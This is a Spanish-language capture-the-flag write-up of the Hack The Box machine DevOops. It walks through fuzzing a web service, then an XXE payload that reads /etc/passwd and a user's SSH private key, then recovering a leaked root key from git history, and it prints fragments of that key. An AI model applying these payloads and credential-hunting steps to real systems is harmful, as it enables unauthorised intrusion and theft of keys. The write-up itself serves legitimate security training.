---
layout: single
title: DevOops - Hack The Box
excerpt: "Maquina sencillita. XML y encontrar un repo Git con credenciales leakeadas"
date: 2018-11-24
classes: wide
header:
  teaser: /assets/images/htb-devoops/devops1.png
categories:
  - hackthebox
  - writeup
tags:
  - hackthebox
  - Git
  - XXE
---


# 10.10.10.91 - DevOops
![](/assets/images/htb-devoops/devops1.png)

-----------------------
# Part 1: Enumeración

PUertos abiertos 22(ssh), 5000
![](/assets/images/htb-devoops/devops2.PNG)


```console
└─$ curl -s http://10.10.10.91:5000
Under construction!
This is feed.py, which will become the MVP for Blogfeeder application.
TODO: replace this with the proper feed from the dev.solita.fi backend.
[/feed]

└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 'http://10.10.10.91:5000/FUZZ/'
000000347:   200        0 L      39 W       347 Ch      "upload"                                             
000000112:   200        1815 L   24122 W    517022 Ch   "feed"
└─$ wfuzz -t 200 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 'http://10.10.10.91:5000/FUZZ.php'
# Nada
└─$ wfuzz -c --hw=31 -w $(locate subdomains-top1million-5000.txt) -H "Host: FUZZ.10.10.10.91:5000" -u http://10.10.10.91:5000/ -t 100
# Tampoco
```

**/feed** -> nos muestra la misma foto que salia en el puerto 5000

-----------------------
# Part 2: XXE

En **/uploads** nos piden un xml con una estrcutura muy concreta:

![](/assets/images/htb-devoops/devops3.PNG)

```
<?xml version="1.0" encoding="UTF-8"?>
<elements>
    <Author>William Gibson</Author>
    <Subject>Cyberpunk</Subject>
    <Content>Neuromante</Content>
</elements>
```
```
PROCESSED BLOGPOST: Author: William Gibson Subject: Cyberpunk Content: Neuromante 
URL for later reference: /uploads/test.xml File path: /home/roosa/deploy/src
```
Esto nos leakea el lugar donde se sube y una ruta/usuario del sistema "roosa"

Si subimos un XML "muy especial" (inyeccion XXE)
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<elements>
    <Author>&xxe;</Author>
    <Subject>Cyberpunk</Subject>
    <Content>Neuromante</Content>
</elements>
```
Conclusión: Usarios -> root git y roosa

Como sabemos que existe el usuario roosa, podemos pedir su llave ```/home/roosa/.ssh/id_rsa```

![](/assets/images/htb-devoops/devops4.PNG)

```console
└─$ ssh -i id_rsa roosa@10.10.10.91
```
-----------------------
# Part 3: En el sistema
```console
roosa@devoops:~$ cat run-blogfeed.sh
#/bin/bash

# TODO: replace with better script and run as blogfeed user which is restricted

cd /home/roosa/work/blogfeed/src
../run-gunicorn.sh
```
- Archivos que llaman la atencion: /home/roosa/deploy/src/app.py~ /home/roosa/service.sh 
La "~" significa backup, con diff vemos las diferencias...
```console
roosa@devoops:/tmp$ diff <(cat /home/roosa/deploy/src/app.py~) <(cat /home/roosa/deploy/src/app.py)
<   run_gunicorn_app("0.0.0.0", 5000, True, )
>   run_gunicorn_app("0.0.0.0", 5000, True, None)
```
En la carpeta home de esta persona hay un script de bash.

```console
roosa@devoops:~$ cat run-blogfeed.sh
#/bin/bash

# TODO: replace with better script and run as blogfeed user which is restricted

cd /home/roosa/work/blogfeed/src
../run-gunicorn.sh
```

En esa carpeta hay un script.sh entre otras cosas:
```bash
roosa@devoops:~/work/blogfeed$ cat run-gunicorn.sh
#!/bin/sh

export FLASK_APP=feed.py
export WERKZEUG_DEBUG_PIN=151237652
gunicorn -w 10 -b 0.0.0.0:5000 --log-file feed.log --log-level DEBUG --access-logfile access.log feed:app
```
Si buscamos más en esa carpeta... Encontramos un repositorio.
```console
roosa@devoops:~/work/blogfeed$ ls -la
drwxrwx--- 8 roosa roosa 4096 Mar 26  2021 .git
...
```

-----------------------
# Part 4: Leak

SIempre que nos topemos con un git, hay que ver antiguas versiones del proyecto a ver si hay cosas criticas que hayan quitado...
```console
roosa@devoops:~/work/blogfeed/.git$ git log --oneline
7ff507d Use Base64 for pickle feed loading
26ae6c8 Set PIN to make debugging faster as it will no longer change every time the application code is chang
ed. Remember to remove before production use.
cec54d8 Debug support added to make development more agile.
ca3e768 Blogfeed app, initial version.
dfebfdf Gunicorn startup script
33e87c3 reverted accidental commit with proper key
d387abf add key for feed integration from tnerprise backend
1422e5a Initial commit

roosa@devoops:~/work/blogfeed/.git$ git diff 7ff507d 26ae6c8
# Sale esta ruta /debugconsole pero no aparece si la busco en el navegador lo mismo con /newpost

roosa@devoops:~/work/blogfeed/.git$ git diff 7ff507d d387abf
# a/resources/integration/authcredentials.key
 -----BEGIN RSA PRIVATE KEY-----
-MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
-ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
+vr+5Ui0nD+YBKyYuiN+4CB8jSQvwOG+LlA3IGAzVf56J0WP9FILH/NwYW2iovTRK
```
Han sustituido el contenido de una llave privada por otra. Dicha llave existe: 
```console
roosa@devoops:~/work/blogfeed/resources/integration$ cat authcredentials.key
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApc7idlMQHM4QDf2d8MFjIW40UickQx/cvxPZX0XunSLD8veN
ouroJLw0Qtfh+dS6y+rbHnj4+HySF1HCAWs53MYS7m67bCZh9Bj21+E4fz/uwDSE
...
roosa@devoops:~/work/blogfeed/resources/integration$ cp authcredentials.key /tmp/
```
La llave esta es la que han cambiado, si la cambio por la nueva... (quitando los "+" claro)
```
+MIIEogIBAAKCAQEArDvzJ0k7T856dw2pnIrStl0GwoU/WFI+OPQcpOVj9DdSIEde
+8PDgpt/tBpY7a/xt3sP5rD7JEuvnpWRLteqKZ8hlCvt+4oP7DqWXoo/hfaUUyU5i
...
```
Podemos acceder como root
```console
roosa@devoops:/tmp$ ssh -i id_rsa root@localhost
root@devoops:~#
```